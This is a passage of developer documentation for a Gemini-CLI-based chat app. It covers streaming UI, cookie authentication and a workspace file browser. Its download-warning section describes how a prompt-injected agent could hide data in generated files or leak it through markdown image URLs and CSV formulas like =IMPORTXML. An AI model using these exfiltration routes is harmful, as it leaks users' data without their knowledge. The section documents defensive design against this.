  gap: 0.5rem;
}

@keyframes blink {
  0%, 100% { opacity: 0.3; }
  50% { opacity: 1; }
}

.typing-dots span {
  animation: blink 1.4s infinite;
}
```

#### 3. Blinking Cursor on Streaming Text

Added visual indicator at the end of streaming content:

**Implementation**: See `frontend/src/components/ChatPanel.tsx` for the streaming message content rendering (ReactMarkdown with `remarkGfm`, `remarkBreaks`, `rehypeHighlight` plugins, followed by cursor span).

**CSS**:
```css
.streaming-cursor {
  display: inline-block;
  width: 8px;
  height: 1em;
  background-color: #646cff;
  margin-left: 2px;
  animation: blink 1s infinite;
  vertical-align: text-bottom;
}

@keyframes blink {
  0%, 49% { opacity: 1; }
  50%, 100% { opacity: 0; }
}
```

**Features**:
- Blinking cursor positioned after streaming text
- Primary color (#646cff) for visibility
- 1s blink cycle (on for 0.5s, off for 0.5s)
- Vertical alignment matches text baseline
- Light mode support with same color

#### 4. Backend Conversation Memory

Enhanced Gemini CLI integration to remember conversation history:

**Changes in `chat/gemini_docker.py` (line 144)**:
```python
# Old: Without conversation memory
cmd = [
    "gemini",
    "--yolo",
    "--model", "gemini-3.1-pro-preview",
    "--output-format=stream-json",
    "-p", prompt
]

# New: With conversation memory (-r flag)
cmd = [
    "gemini",
    "--yolo",
    "-r",  # Remember conversation history
    "--model", "gemini-3.1-pro-preview",
    "--output-format=stream-json",
    "-p", prompt
]
```

**Impact**:
- Gemini now maintains context across messages in the same conversation
- Each conversation's Gemini state persists in `data/chats/{id}/gemini/`
- Users can have multi-turn conversations with context retention
- Previous messages influence future responses

**State Persistence**:
- Gemini CLI stores conversation state in `/home/gemini/.gemini/` (inside container)
- This directory is mounted from `data/chats/{id}/gemini/` on host
- State includes: conversation history, settings, session data
- Each conversation has isolated Gemini state

### Modified Files

**Frontend Changes**:
1. `frontend/src/components/ChatPanel.tsx`
   - ReactMarkdown with `remarkGfm`, `remarkBreaks`, and `rehypeHighlight` plugins for streaming messages
   - Pre-stream typing indicator with conditional render
   - Streaming cursor span after markdown content

2. `frontend/src/components/ChatPanel.css`
   - `.typing-placeholder` styles with flexbox layout
   - `.typing-dots` animation for bouncing dots
   - `.streaming-cursor` styles with blink animation
   - `.message.streaming .message-content` uses `white-space: normal` (newlines handled by `remark-breaks` `<br>` elements)
   - Light mode support for streaming elements
   - Keyframe animations for blink and dot bounce effects

**Backend Changes**:
3. `chat/gemini_docker.py`
   - Added `-r` flag to Gemini CLI command (line 144)
   - Enables conversation memory across messages
   - No other changes to Docker integration

### User Experience Flow

**Before First Chunk**:
```
User sends message
       ↓
ChatPanel sets isStreaming = true
       ↓
partialResponse = "" (empty)
       ↓
Typing indicator displayed: "Generating response..."
       ↓
Docker container starts, Gemini initializes
```

**During Streaming**:
```
First chunk arrives
       ↓
partialResponse updated with chunk
       ↓
Typing indicator disappears
       ↓
Markdown rendering begins
       ↓
Blinking cursor appears at end
       ↓
Each new chunk:
  - Appended to partialResponse
  - Markdown re-renders
  - Cursor stays at end
  - Auto-scroll if user near bottom
```

**After Streaming**:
```
Stream completes
       ↓
isStreaming = false
       ↓
Streaming message removed
       ↓
Message component added to history
       ↓
Cursor and typing indicator gone
```

### Performance Considerations

**Markdown Re-Rendering**:
- `ReactMarkdown` parses on every chunk update
- Typical chunk size: 1-50 characters
- Stream rate: 5-20 chunks per second
- React reconciliation minimizes DOM updates
- Only changed portions of markdown tree update

**Optimization Opportunities** (not yet implemented):
- Debounce markdown rendering (e.g., 100ms)
- Only render full markdown every N chunks
- Use `React.memo()` on streaming message wrapper
- Virtualize long streaming messages

**Current Performance**:
- No noticeable lag on typical hardware
- Smooth rendering up to ~1000 character responses
- Very long responses (10,000+ chars) may show brief delays
- Syntax highlighting is the most expensive operation

### CSS Animations

**Blink Animation** (used by cursor):
```css
@keyframes blink {
  0%, 49% { opacity: 1; }    /* Visible */
  50%, 100% { opacity: 0; }  /* Hidden */
}
```

**Bounce Animation** (used by typing dots):
```css
.typing-dots span:nth-child(1) { animation-delay: 0s; }
.typing-dots span:nth-child(2) { animation-delay: 0.2s; }
.typing-dots span:nth-child(3) { animation-delay: 0.4s; }
```

**Light Mode Adaptations**:
- Cursor color remains #646cff (consistent brand color)
- Typing placeholder uses lighter opacity
- All animations work identically in both modes

### Browser Compatibility

**Features Used**:
- CSS animations (widely supported)
- Flexbox (all modern browsers)
- `@keyframes` (all modern browsers)
- Inline-block display (universal)
- Opacity transitions (universal)

**No Special Requirements**:
- No vendor prefixes needed
- No polyfills required
- Works in all browsers that support React 19

### Accessibility

**Typing Indicator**:
- Text content: "Generating response..." (screen reader accessible)
- Animated dots are decorative (no accessibility impact)
- Color contrast meets WCAG AA standards

**Streaming Cursor**:
- Purely visual indicator (decorative)
- No semantic meaning for screen readers
- Provides visual feedback for sighted users

**Streaming Content**:
- Markdown renders to semantic HTML
- Screen readers announce content as it arrives
- Links and headings properly tagged

### Testing Streaming UI

**Manual Testing Checklist**:
1. Send message and verify typing indicator appears
2. Verify typing indicator disappears when first chunk arrives
3. Verify blinking cursor appears at end of streaming text
4. Verify markdown renders during streaming (try code blocks)
5. Verify cursor blinks at consistent rate
6. Verify cursor disappears when stream completes
7. Test in both light and dark mode
8. Test with long responses (scrolling behavior)
9. Test with rapid messages (state management)
10. Verify conversation memory works across messages

**Edge Cases**:
- Empty stream (no chunks): Typing indicator shows until timeout
- Very slow stream: Cursor blinks on each word
- Very fast stream: Smooth rendering, cursor always visible
- Stream error: Typing indicator and cursor removed, error shown

## Authentication Integration

The frontend implements session-based authentication using the session cookie (named `COOKIE_NAME` from `auth/config.py`; `quest_session` in production, `quest_session_dev` in development). The frontend authenticates directly via the cookie -- no API key is stored or transmitted by the browser.

### Implemented Features

#### 1. Session-Based Authentication

`AuthContext` checks authentication on mount by calling `checkSession()` (which hits `GET /app/api/me` with `credentials: 'include'`). If the session is valid, the user's email and name are stored in context state.

**Behavior**:
- Calls `GET /app/api/me` with session cookie on mount
- If valid: sets `isAuthenticated = true`, stores `userEmail`, `userName`, and `hasAnyServiceConnected`
- If `hasAnyServiceConnected` is false, auto-opens settings to Data Connections (desktop layout only, never on mobile)
- If invalid: sets `isAuthenticated = false`, App shows inline `SignInScreen`
- All subsequent API calls use `credentials: 'include'` (cookie sent automatically)
- WebSocket connections send cookie automatically (no `?api_key=` needed)

#### 2. Loading State

Shows a loading indicator while checking session. The page displays the `appName` heading ("DevQuest" in dev mode, "Quest" in production) with a "Loading..." message during `isCheckingAuth`.

**User Experience**:
- Brief "Loading..." message on initial page load
- Quickly transitions to chat interface if session valid
- Shows inline `SignInScreen` if session invalid

#### 3. Inline Sign-In

If the session check fails, the frontend renders the `SignInScreen` component inline. The `SignInScreen` fetches the Google OAuth URL from `GET /auth/login-url` and displays a "Sign in with Google" button. When `isDevMode` is true (from AppConfigContext), the SignInScreen also shows a dev login section below the Google button: an email input field and a "Dev Login" button separated by an "or" divider. Dev login submits `POST /auth/dev-login` with `{"email": "..."}` and reloads the page on success.

**Sign-In Scenarios**:
- User not logged in (no session cookie)
- Session cookie expired or invalid
- Network error during session check
- Backend unavailable
- Dev mode: user enters any email address via the dev login form (no Google account needed)

### Backend Endpoint

**Endpoint**: `GET /app/api/me` (see `chat/routes/user.py`)

**Authentication**: Session cookie or API key Bearer token (dual auth)

**Response shape**: `{ email, name }`

**Error Responses**:
- `401 Unauthorized`: No valid session or API key
- `403 Forbidden`: User not allowed (domain restriction)

**Note**: `GET /app/api/user` (the older endpoint that returns `api_key`) is deprecated but still available for backward compatibility.

### Authentication Flow

```
1. User visits / (or /chats/<id> or /projects/<pid>/<id>) → React Router matches route → AppProviders mounts
2. Fetches GET /app/api/config → derives appName ("DevQuest" or "Quest"), sets isDevMode
3. checkSession() calls GET /app/api/me with cookie
4. App.tsx sets document.title to appName
5. Session valid? → YES → isAuthenticated = true → Show chat interface (URL params synced to context)
6. Session invalid? → Show inline SignInScreen (heading uses appName)
7. (Dev mode only) SignInScreen shows dev login form → POST /auth/dev-login → reload
```

### Integration Points

**Frontend**:
- `frontend/src/utils/auth.ts` -- `checkSession()` function
- `frontend/src/contexts/AuthContext.tsx` -- Session check on mount, `isAuthenticated` state; `frontend/src/contexts/AppConfigContext.tsx` -- `isDevMode` boolean for conditional dev login UI
- `frontend/src/App.tsx` -- Shows `SignInScreen` when not authenticated
- `frontend/src/components/SignInScreen.tsx` -- Fetches OAuth URL from `GET /auth/login-url`; in dev mode, also renders email input + "Dev Login" button for `POST /auth/dev-login`

**Backend**:
- `chat/routes/user.py` -- `GET /app/api/me` endpoint (dual auth: cookie or API key)

### Security Considerations

**Cookie Security**:
- Session cookie (name from `COOKIE_NAME` in `auth/config.py`, environment-dependent) is signed (itsdangerous) and uses a versioned payload (`{"v": COOKIE_VERSION, "uid": user_id}`)
- `get_user_from_cookie()` in `auth/session.py` enforces strict type checks: `uid` and `v` must be `int` but not `bool`, and `uid` must be positive (prevents `bool` subclass of `int` from allowing `uid: true` to resolve to user ID 1)
- Same-origin policy protects cookie access
- `credentials: 'include'` required for cross-origin requests in dev
- No API key stored in localStorage, dev tools, or WebSocket URLs

**Domain Restriction**:
- Backend enforces the allowed login domain
- Returns 403 for unauthorized domains
- Same restriction as other API endpoints

## Right Panel (File Browser and Project Tables)

The right panel shows the file spaces of what is on screen as floating cards, plus the project database table browser for projects. The `RightPanel` component (`frontend/src/components/RightPanel.tsx`) picks the card set:

| On screen | Cards |
|-----------|-------|
| Project conversation | **Chat Files** (`FileBrowser` over the conversation's own workspace, `/conversations/{cid}/files...`), **Project Files** (`FileBrowser` over the project's shared workspace, `/projects/{pid}/files...`), **Tables** (`ProjectTables`) |
| Standalone conversation | **Chat Files** alone, full height |
| Home composer while the Sidebar is drilled into a project (URL `/`, no conversation yet) | **Project Files** and **Tables**, served by the project routes |
| Nothing | the `FileBrowser` empty state ("Select a conversation to browse files") |

Each `FileBrowser` takes a `source` prop (`conversationSource(cid)` / `projectSource(pid)` from `api/fileApi.ts`) that selects its routes, its title and its `file_list_changed` filter; see [File Browser API](../api/file-browser-api.md). Without a conversation `RightPanel` falls back to the context `drilledProjectId` (with a live conversation the URL always wins, so a standalone chat viewed while the Sidebar is drilled never grows project cards). The whole panel is horizontally resizable via a drag handle on its left edge; see the RightPanel Component section for the persisted width and split.

**Copy / Move between the two file cards:** in a project conversation each row's actions menu gains "Copy to project" / "Move to project" on the Chat Files card and "Copy to chat" / "Move to chat" on the Project Files card, supplied through the `FileBrowser` `rowActions` prop by `useWorkspaceCopy` (`frontend/src/hooks/useWorkspaceCopy.ts`). They call `copyFileToProject` / `copyFileFromProject` (the copy routes, same relative path on the other side, `includeHidden` following the source card's show-hidden toggle). Rows in the conversation scratch roots (`.responses/`, `.subagent_responses/`, `pasted/`) get no to-project items, mirroring the route's `forbidden_source` rule. A `409 destination_exists` opens an overwrite confirm (`DocConfirmDialog`) that retries with `overwrite: true`; other failures, and a move whose copy landed but whose source could not be removed (`moved: false`), show as a dismissible notice on the card the action started from (`FileBrowser` `notice` prop), as does a copy that reports `skipped` entries (dot-entries left out, symlinks, special files). Row actions are disabled while their copy is in flight or the overwrite prompt is open; results arriving after a conversation switch are dropped. Both cards refresh from the `file_list_changed` events the copy routes publish for each scope. Standalone chats and the drilled home composer get no Copy / Move items.

### Overview

The file browser provides a right-side panel in the chat interface that allows users to:
- Browse files and folders created by Gemini in the workspace (dot-prefixed entries like `.responses/` / `.temp/` are hidden by default, revealable via an Eye/EyeOff toggle)
- View text file content (`.md`, `.py`, `.txt`, `.json`), images (`.png`, `.jpg`, `.jpeg`, `.gif`, `.svg`, `.webp`, `.bmp`, `.ico`, `.avif`), PDFs (`.pdf`), and CSVs (`.csv`) in a full-screen modal by clicking on the file; JSON files render in a collapsible tree viewer; PDFs render in a two-pane pdf.js viewer with a thumbnail rail; `.md` files render as HTML by default (react-markdown, reusing the chat renderer's `markdownComponents`) with a "Show rendered" header toggle to flip to the raw source; `.csv` files render as a styled sortable table by default (reusing the project-tables visual styling, client-side parse/sort) with a "Show raw" header toggle to flip to the raw source
- Upload files and folders via drag-and-drop (folders are recursively traversed, preserving directory structure)
- Upload files via the Upload Files button
- Create new folders in the currently-viewed directory via the New Folder button (opens `NewFolderModal`)
- Download files via a meatball menu (three-dot icon)
- Download folders as zip via a "Download as Zip" option in the meatball menu
- Every download of a non-plain-text type (and every folder zip) first shows the hidden-data warning dialog, see [Workspace Download Warning](#workspace-download-warning) below
- Delete files and folders via the meatball menu with confirmation dialog
- Navigate folder structures with back/forward/up buttons

### Key Files

| File | Description |
|------|-------------|
| `frontend/src/components/RightPanel.tsx` | Wrapper that picks the card set (Chat Files / Project Files / Tables, see above) and stacks the cards with draggable dividers; persists the vertical split per project to localStorage; renders the Copy / Move overwrite confirm; also owns the panel's horizontal width with a left-edge drag handle, persisted browser-wide to localStorage |
| `frontend/src/hooks/useWorkspaceCopy.ts` | Copy / Move between Chat Files and Project Files in a project conversation: both cards' `rowActions`, the 409 overwrite prompt state, per-card notices, actions disabled while their copy is in flight |
| `frontend/src/components/RightPanel.css` | RightPanel styling (transparent gutter column; `.right-panel-card` floating-card chrome for each unit; hover-revealed `::after` pills on the left-edge width handle `.right-panel-resize-handle` and the inter-card `.right-panel-divider`, kept visible mid-drag by `.resizing-width` / `.resizing-split`) |
| `frontend/src/components/FileBrowser.tsx` | Main file browser UI component (supports file and folder drag-and-drop, opens FileViewerModal for viewable files including JSON and images, folder download as zip, split Upload Files + New Folder action buttons with Lucide icons, opens NewFolderModal on click, hides dot-prefixed entries by default behind a stateful Eye/EyeOff toggle); uses Lucide icons via `getFileIconInfo()` for extension-specific file icons and `Folder` for directories |
| `frontend/src/components/FileBrowser.css` | File browser styling (flex layout, multi-line error display, upload progress bar, zipping notification bar, equal-width action button row via `.file-browser-action-buttons` / `.action-button`, show-hidden toggle button, hidden-count empty-state hint, and 16 icon color classes for file-type icons in dark/light mode) |
| `frontend/src/components/NewFolderModal.tsx` | Portal modal for creating a new folder in the current workspace path; mirrors `NewProjectModal` (auto-focus, trim, disabled-while-empty, inline error display, closes on success) |
| `frontend/src/components/NewFolderModal.css` | NewFolderModal styling with dark/light mode variants |
| `frontend/src/components/FileViewerModal.tsx` | Full-screen modal for viewing text files, JSON files (via `JsonTreeViewer`), images, PDFs (via `PdfViewer`), and CSVs (rendered as a sortable table) with download button, Save to Drive button (for `.md` files), and image blob display with metadata; `.md` files render as HTML via `react-markdown` (reusing the chat renderer's `markdownComponents` from `Message.tsx`) with a "Show rendered" sliding toggle in the header to flip to the raw `<pre>` source; `.csv` files parse client-side (`frontend/src/utils/csv.ts`) and render as a styled sortable table with a "Show raw" toggle to flip to the raw `<pre>` source |
| `frontend/src/components/FileViewerModal.css` | FileViewerModal styling (includes checkerboard background for image transparency, the edge-to-edge `--pdf` content variant, the `.file-viewer-md-switch` sliding toggle, `.file-viewer-markdown` rendered-markdown element styling with an idempotent highlight.js theme `@import`, and `.file-viewer-csv-*` table styles adapted from `.table-viewer-table*`) |
| `frontend/src/utils/csv.ts` | Dependency-free RFC-4180-aware CSV parser (`parseCsv`); handles quoted fields with embedded commas/newlines, `""` escapes, mixed line endings, and ragged rows; never throws (returns a fallback so callers fall back to raw display on failure) |
| `frontend/src/components/JsonTreeViewer.tsx` | Recursive collapsible tree viewer for JSON files with syntax coloring, expand/collapse toggles, and item count badges; dark/light mode support |
| `frontend/src/components/JsonTreeViewer.css` | JsonTreeViewer styling (syntax colors, toggle controls, dark/light mode variants) |
| `frontend/src/components/PdfViewer.tsx` | In-modal PDF viewer built directly on pdfjs-dist (no wrapper library): thumbnail rail + fit-to-width page scroller, IntersectionObserver-lazy canvas rendering with offscreen eviction, scroll-spy current-page tracking, password/corrupt/per-page error states |
| `frontend/src/components/PdfViewer.css` | PdfViewer styling (two-pane layout, thumbnail rail, active-thumbnail highlight, page placeholders, dark/light mode) |
| `frontend/src/components/ProjectTables.tsx` | Lists tables in the project database with meatball menu for deletion, auto-refreshes on WebSocket events, opens TableViewerModal on click |
| `frontend/src/components/ProjectTables.css` | ProjectTables styling (includes meatball menu positioning, hover reveal, dark/light mode) |
| `frontend/src/components/TableViewerModal.tsx` | Modal (via `createPortal`) for viewing table data with sticky headers, pagination, NULL styling, and cell truncation with tooltips |
| `frontend/src/components/TableViewerModal.css` | TableViewerModal styling |
| `frontend/src/hooks/useFileBrowser.ts` | State management hook for file operations (includes `uploadFilesWithPaths`, `buildUploadErrorMessage`, `deleteItem`, `downloadFile` / `downloadFolder` behind the download warning's `confirmDownload`, `createFolder`, and `uploadPercent` state for progress tracking) |
| `frontend/src/api/fileApi.ts` | API client functions for file endpoints (includes `xhrUpload()` helper for XHR-based uploads with progress callback, `uploadFiles()` and `uploadFilesWithPaths()` with `onProgress` parameter, `fetchFileContent()`, `getFileInfo()`, `deleteFile()`, `downloadFolder()`, `createFolder()`, and `saveBlobToDisk()` -- the one temporary-anchor "hand the blob to the browser" step every workspace download ends with) |
| `frontend/src/contexts/DownloadWarningContext.tsx` | `DownloadWarningProvider` (in `AppProviders`) renders the single hidden-data warning dialog and exposes `confirmDownload(target)` via `useDownloadWarning()`; see [Workspace Download Warning](#workspace-download-warning) |
| `frontend/src/hooks/useWorkspaceDownload.ts` | `useWorkspaceDownload()` -- the component-side way to download a workspace file: `confirmDownload`, then `downloadFile()`, then `saveBlobToDisk()`; used by the chat attachment viewer (`ChatPanel.tsx`), `SubagentReturnFilesPreview.tsx` and `DocImagePreview.tsx` |
| `frontend/src/utils/downloadWarnings.ts` | Pure rule `getDownloadWarning(target)`: which file types warn, with which category explanation and severity (`INERT_TEXT_EXTENSIONS` allow-list, `CATEGORY_EXTENSIONS` incl. the `markup` / `code` text splits, `CATEGORY_DETAILS`, `SEVERE_CATEGORIES`) |
| `frontend/src/api/projectDbApi.ts` | API client for project database table browsing and management (`fetchProjectTables()`, `fetchTableData()`, `deleteProjectTable()`) |
| `frontend/src/utils/fileIcons.ts` | Extension-to-icon mapping utility; maps ~50 file extensions across 16 categories to Lucide icon components and CSS color classes via `getFileIconInfo()` |
| `frontend/src/utils/directoryTraversal.ts` | Recursive directory traversal via `webkitGetAsEntry()` API; exports `FileWithPath` interface and `extractFilesFromDataTransfer()` |
| `chat/file_routes.py` | Backend API endpoints (list, upload, download, download folder as zip, read content, file info, delete, create folder, save to Drive) |
| `chat/file_storage.py` | File operations, path validation, directory conflict detection, upload size limit (`MAX_FILE_SIZE`, 200MB), text content reading (`get_file_content()`, `VIEWABLE_EXTENSIONS`, `MAX_VIEW_SIZE`), file/folder info (`count_workspace_item_files()`), deletion (`delete_workspace_item()`), folder zipping (`create_folder_zip()`), and folder creation (`create_workspace_folder()`) |
| `chat/project_db_routes.py` | Backend API endpoints for project database table browsing and management (`list_project_tables`, `get_project_table_data`, `delete_project_table`) |

### Implemented Components

#### 1. FileBrowser Component (`src/components/FileBrowser.tsx`)

The main file browser panel displayed on the right side of the chat interface.

**Props Interface**:
- `source`: the file space browsed (`{kind: 'conversation', id}` or `{kind: 'project', id}`), or null for the empty state
- `rowActions`: optional extra row-menu items (rendered between the Download items and Delete); RightPanel passes the Copy / Move items here
- `notice` / `onDismissNotice`: optional host message shown under the toolbar (`error` or `warning` tone), used for Copy / Move results

**Features**:
- Header by source: "Chat Files" for a conversation, "Project Files" for a project
- List view of files and folders with extension-specific Lucide icons (folders use `Folder` icon; files use `getFileIconInfo()` from `frontend/src/utils/fileIcons.ts` to select icon and color class by extension)
- File metadata display (size, modification date)
- Click-to-view for text files, JSON files, images, PDFs, and CSVs: clicking a viewable file opens a `FileViewerModal`. Text files (`.md`, `.py`, `.txt`, `.json`), image files (`.png`, `.jpg`, `.jpeg`, `.gif`, `.svg`, `.webp`, `.bmp`, `.ico`, `.avif`), PDFs (`.pdf`), and CSVs (`.csv`) are viewable.
  - Extensions are defined in `TEXT_EXTENSIONS`, `IMAGE_EXTENSIONS`, `PDF_EXTENSIONS`, and `CSV_EXTENSIONS` constants in `FileBrowser.tsx`; text and CSV extensions match `VIEWABLE_EXTENSIONS` in `chat/file_storage.py`.
  - JSON files render in a collapsible tree viewer (`JsonTreeViewer`) with syntax coloring; malformed JSON falls back to raw `<pre>` display. PDFs render via `PdfViewer` (pdf.js). CSVs render as a styled sortable table (client-side parse via `frontend/src/utils/csv.ts`); a parse failure falls back to raw `<pre>` display
- Meatball menu (three-dot icon) on each file and folder with "Download" (files only), "Download as Zip" (folders only), and "Delete" (files and folders) options
- Deletion with `window.confirm()` confirmation; for folders, shows total file count (e.g., "This will delete 5 files.")
- Action bar with two equal-width buttons -- Upload Files (Lucide `Upload` icon) and New Folder (Lucide `FolderPlus` icon) -- sharing the `uploadProgress || isInitialLoading` disabled condition so the workspace cannot be mutated mid-upload. Layout classes `.file-browser-action-buttons` and `.action-button` are defined in `FileBrowser.css`
- Drag-and-drop upload support (files and folders); maximum file size is 200MB (`MAX_FILE_SIZE` in `chat/file_storage.py`)
- New folder creation: clicking the New Folder button opens `NewFolderModal` (`frontend/src/components/NewFolderModal.tsx`), which calls `createFolder(name)` from `useFileBrowser`; the folder is created in the currently-viewed directory and the listing auto-refreshes on success
- Upload progress tracking: displays real-time upload percentage and a progress bar during file uploads (driven by `uploadPercent` state from `useFileBrowser`)
- Folder drag-and-drop: uses `extractFilesFromDataTransfer()` from `frontend/src/utils/directoryTraversal.ts` to recursively traverse dropped directories and upload with preserved directory structure
- Mixed drops (files + folders) handled correctly
- `.DS_Store` files automatically filtered out during folder uploads
- Folder navigation (click to enter)
- Navigation controls (back, forward, up buttons)
- Current path breadcrumb display
- Hidden-entry filtering: files and folders whose names start with `.` (e.g. `.responses/`, `.temp/`) are filtered out of the rendered list by default. A stateful Eye/EyeOff toolbar toggle reveals/hides them, and an empty-state hint reports how many hidden items exist. This is purely client-side -- the list REST endpoint (`chat/file_routes.py`) still returns every entry; see [File Browser API](../api/file-browser-api.md)
- Silent auto-refresh on `file_list_changed` per-user globals (200ms debounce; no loading flicker), filtered by the card's own space (scope `conversation` + its conversation id, or scope `project` + its project id). See [Realtime Architecture](realtime.md)
- Loading and error states
- Structured error display: when some files in a batch fail, errors are shown in a scrollable list with per-file details (summary line plus individual error items)

**Loading State Handling**:
- Uses `isInitialLoading` (loading AND no files yet) for button disabled states
- Buttons remain enabled during background refreshes (stale-while-revalidate)
- Prevents button flickering during auto-refresh cycles after workspace mutations

#### 2. FileBrowser Styling (`src/components/FileBrowser.css`) and FileViewerModal Styling (`src/components/FileViewerModal.css`)

Comprehensive CSS with dark/light mode support. `FileViewerModal.css` includes a checkerboard background pattern for image transparency visibility and responsive image scaling.

**Layout**:
- Right panel width is owned by `RightPanel` (user-resizable, see the RightPanel Component section); FileBrowser fills it via flex layout
- Scrollable file list
- Sticky header with navigation controls
- Responsive file item rows

**File Items**:
- Extension-specific Lucide icons with per-category color classes (16 categories covering Python, JavaScript, TypeScript, HTML, CSS, JSON, data/config, markdown/text, images, PDF, Word, Excel, PowerPoint, archives, databases, and shell scripts); color classes defined in `FileBrowser.css` with dark/light mode variants
- Filename with ellipsis overflow
- Size and date metadata
- Hover effects
- Meatball menu (three-dot icon) with contextual actions

**States**:
- Loading state with spinner
- Upload progress bar with percentage (`.upload-progress-bar` and `.upload-progress-bar-fill` classes)
- Error state with message
- Empty state for empty directories

#### 3. useFileBrowser Hook (`src/hooks/useFileBrowser.ts`)

React hook managing file browser state and operations.

**Parameters**:
- `conversationId`: Conversation to browse files for

**Return Values**:
- `files`: Array of file/folder entries
- `currentPath`: Current browsing path
- `loading`: Whether loading file list
- `error`: Error message if any
- `uploadProgress`: Whether upload is in progress
- `uploadPercent`: Current upload progress as a percentage (0-100), or null when not uploading; drives the progress bar and percentage text in the FileBrowser UI
- `canGoUp`, `canGoBack`, `canGoForward`: Navigation availability flags
- `navigateToFolder(name)`: Navigate into a folder
- `goUp()`: Go to parent directory
- `goBack()`: Go to previous path in history
- `goForward()`: Go to next path in history
- `refresh()`: Reload current file list (shows loading state)
- `silentRefresh()`: Reload without showing loading state (for auto-refresh)
- `uploadFiles(files)`: Upload flat files to current path
- `uploadFilesWithPaths(files)`: Upload files with relative paths for folder uploads (uses `uploadFilesWithPaths()` from `frontend/src/api/fileApi.ts`)
- `downloadFile(path)`: Download a file -- after `confirmDownload()` from `DownloadWarningContext` when the type warns (a cancelled warning returns without fetching or setting an error)
- `downloadFolder(path)`: Download a folder as a zip archive (always behind `confirmDownload()`; sets `zippingFolder` state for the notification bar only once acknowledged)
- `zippingFolder`: Name of the folder currently being zipped (null when not zipping)
- `deleteItem(path)`: Delete a file or folder (fetches info for confirmation, then deletes on user confirm)
- `createFolder(name)`: Create a new folder inside the current path via `createFolder()` in `frontend/src/api/fileApi.ts`; refreshes the listing on success

**Path State**:
- Per-conversation path state stored in `FileBrowserStateContext`
- Navigation history maintained for back/forward
- Path persists when switching between conversations

**Stale-While-Revalidate Pattern**:
The hook implements a stale-while-revalidate pattern for smoother UX:
- `fetchFilesInternal(silent)` accepts a `silent` parameter to skip loading state updates
- `refresh()` calls `fetchFilesInternal(false)` - shows loading spinner for user-initiated refreshes
- `silentRefresh()` calls `fetchFilesInternal(true)` - fetches in background without loading state
- Conversation switches use silent mode to prevent flickering when changing contexts, but reset the stale `files`/`canGoUp` state first so the previous conversation's listing can never momentarily show while the new fetch is in flight

**Conversation Switch and Refetch**:
A single effect (keyed on `conversationId` + `currentPath`) drives both conversation switches and intra-conversation folder navigation, distinguished via `prevConversationIdRef`. A switch resets stale state then silently refetches; folder navigation shows the loading state. Consolidating these two cases into one effect avoids the prior bug where a separate `[conversationId]` and `[currentPath]` effect could fire in the same commit and the shared in-flight guard swallowed the second fetch, leaving the panel on the old conversation's files.

**Circular Dependency Prevention and Stale-Response Guards**:
The hook uses refs to break dependency cycles that could cause infinite refresh loops and to discard out-of-order results:
- `inFlightRef`: Holds the `{ conversationId, path }` of the request currently in flight (or `null` when idle). The duplicate-fetch guard only fires when an in-flight request matches the *same* conversation + path, so a switch is never swallowed by a stale in-flight fetch (this replaced the prior shared `isFetchingRef` boolean, which let one conversation's fetch block the next conversation's first fetch)
- `conversationIdRef`: Mirror of the latest `conversationId` so the async response handler can compare against the *current* conversation without a stale closure
- Each fetch captures its `conversationId` + `path` and discards its results (success or error) if the active conversation/path has moved on before the response lands, so rapid A->B->A switching can't clobber the current list with a stale response
- `browserStateRef`: Stores latest browser state, allowing state updates without effect dependencies

#### Workspace Download Warning

A prompt-injected agent can write files into the workspace that carry information the user never sees -- a script in an HTML page, bytes in an image's EXIF block, a macro or embedded object in an Office document, an extra member in an archive -- and a download is the one step that moves such a file out of the deployment. Until a sanitization layer exists (planned; some types may then be blocked outright or forced through Quest Docs exports), every workspace download of a type that can hide data first shows a blocking warning dialog with Cancel / "Acknowledge and Download". For the raster images the server can rewrite (PNG, JPEG, GIF, WebP) the first piece of that sanitization layer exists: the dialog offers a **sanitized copy** -- `GET .../files/download-sanitized`, pixels kept byte for byte, every other part of the file dropped, tagged "Generated with Quest" (`chat/image_sanitizer.py`, see [File Browser API](../api/file-browser-api.md#conversation-workspace-routes)) -- as the primary action and hands out the original only through a second dialog with a required checkbox.

**Flow** (every one of the nine UI download triggers follows it):

1. A component calls `confirmDownload({name, kind})` from `useDownloadWarning()` and gets a `DownloadDecision` back -- `'cancel'`, `'original'` or `'sanitized'` -- which it passes to `fileApi.downloadFile(target, path, variant)` as the variant (`frontend/src/contexts/DownloadWarningContext.tsx`), either directly (`hooks/useFileBrowser.ts` `downloadFile` / `downloadFolder`, which keep their own error surface and zipping toast) or through `hooks/useWorkspaceDownload.ts` (the chat attachment / markdown-image viewer in `ChatPanel.tsx`, `SubagentReturnFilesPreview.tsx`, `DocImagePreview.tsx`).
2. `getDownloadWarning()` (`frontend/src/utils/downloadWarnings.ts`) decides. Text is split three ways: a file whose extension is in `INERT_TEXT_EXTENSIONS` (txt, log, json, yaml, toml, ini, ...: nothing happens when it is opened) resolves `'original'` at once; `markup` (md, rst, xml, css, csv, tsv) warns because the program rendering it resolves the references it contains -- a markdown image URL fetches a remote resource, a spreadsheet application evaluates a CSV's formula cells (`=HYPERLINK`, `=IMPORTXML`), and the request itself can carry leaked data; `code` (py, ts, js, sh, sql, ipynb, patch, ...) is its own **severe** category because the hazard is running it. A folder is always an `archive`; every other extension -- including an unknown or missing one, since the agent picks the name -- warns with the category explanation from `CATEGORY_DETAILS` (`web`, `image`, `document`, `archive`, `media`, `executable`, `other`). `severity` is `severe` for `code` and `executable` (`SEVERE_CATEGORIES`), `warning` otherwise. An `image` whose extension is in `SANITIZABLE_IMAGE_EXTENSIONS` (png, jpg, jpeg, gif, webp -- hand-mirrored from the formats `chat/image_sanitizer.py` handles; the server picks by magic bytes and 400s the rest) additionally carries `sanitizer: 'image'`.
3. `DownloadWarningProvider` (mounted once in `AppProviders`) opens its `DocConfirmDialog` (`components/docs/DocConfirmDialog.tsx`, the shared confirm) -- for a severe warning with the "This download may be harmful to run" title, the danger tone and a boxed do-not-run / -import / -compile / -install paragraph (`.download-warning-severe`) -- and resolves the promise with the user's answer; only then does the caller fetch (`fileApi.downloadFile` / `downloadFolder`) and hand the blob to the browser (`fileApi.saveBlobToDisk`).
